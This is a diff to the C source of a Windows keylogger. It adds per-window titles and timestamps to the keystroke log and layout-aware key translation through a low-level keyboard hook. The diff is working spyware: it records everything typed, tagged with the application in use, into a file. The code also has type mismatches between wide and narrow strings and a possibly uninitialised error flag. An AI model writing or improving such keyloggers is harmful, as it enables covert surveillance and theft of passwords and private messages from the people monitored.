@@ -8,11 +8,12 @@
 HHOOK _hook;
 BOOL shiftIsHeld = FALSE;
 BOOL capsLockActivated = FALSE;
+HWND currentWindow;
 
 char* handleSpecialCase(DWORD vkCode);
 int openOrCreateFile(char* filename);
 
-int writeLogs (KBDLLHOOKSTRUCT kbdStruct)
+int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
 {
     HANDLE hFile;
     DWORD dwBytesToWrite;
@@ -24,6 +25,40 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct)
     hFile = openOrCreateFile(filename);
     if (hFile == INVALID_HANDLE_VALUE)
         return -1;
+
+    PSTR windowTitle;
+    HWND foreground = GetForegroundWindow();
+    if (foreground)
+    {
+        int cTxtLen = GetWindowTextLengthW(foreground);
+        printf("WINDOW LENGTH: %i", cTxtLen);
+        windowTitle = (PSTR) VirtualAlloc((LPVOID) NULL, (DWORD) (cTxtLen + 1), MEM_COMMIT, PAGE_READWRITE); 
+        GetWindowTextW(foreground, windowTitle, cTxtLen + 1);
+        // for (int i =0; i < cTxtLen; i++)
+        //     windowTitle[i] = 'a';
+
+        if (!currentWindow || currentWindow != foreground)
+        {
+            currentWindow = foreground;
+            SYSTEMTIME st;
+            GetLocalTime(&st);
+            PSTR header = (PSTR) VirtualAlloc((LPVOID) NULL, (DWORD) (cTxtLen + 1024), MEM_COMMIT, PAGE_READWRITE); 
+            snprintf(header, cTxtLen + 1024, "\n[%ls - %02d:%02d]\n", windowTitle, st.wHour, st.wMinute);
+            printf("GOT A CHANGE ADDING %s", header);
+            VirtualFree(windowTitle, 0, MEM_RELEASE); 
+            dwBytesToWrite = strlen(header);
+            dwBytesWritten = 0;
+            bErrorFlag = WriteFile( 
+                            hFile,
+                            header,
+                            dwBytesToWrite,
+                            &dwBytesWritten,
+                            NULL);
+            VirtualFree(header, 0, MEM_RELEASE); 
+            if (FALSE == bErrorFlag)
+                goto handle_error;
+        }
+    }
 
     // Special cases
     char* specialCase = handleSpecialCase(kbdStruct.vkCode);
@@ -43,16 +78,22 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct)
         strcpy_s(keyString, sizeof keyString, specialCase);
     }
 
-    printf("%s", keyString);
-    dwBytesToWrite = strlen(keyString);
+    char charString[16];
+    DWORD threadId = foreground ? GetWindowThreadProcessId(foreground, NULL) : 0;
+    BYTE keyboardState[256];
+    GetKeyboardState(keyboardState);
+    ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, charString, 8, 0, GetKeyboardLayout(threadId));
+
+    dwBytesToWrite = strlen(charString);
     dwBytesWritten = 0;
     bErrorFlag = WriteFile( 
                     hFile,
-                    keyString,
+                    charString,
                     dwBytesToWrite,
                     &dwBytesWritten,
                     NULL);
 
+handle_error:
     if (FALSE == bErrorFlag)
     {
         printf("Terminal failure: Unable to write to file.\n");
@@ -89,7 +130,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
             shiftIsHeld = TRUE;
         if (kbdStruct.vkCode == VK_CAPITAL)
             capsLockActivated = !capsLockActivated;
-        writeLogs(kbdStruct);
+        writeLogs(kbdStruct, lParam);
     }
  
 	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
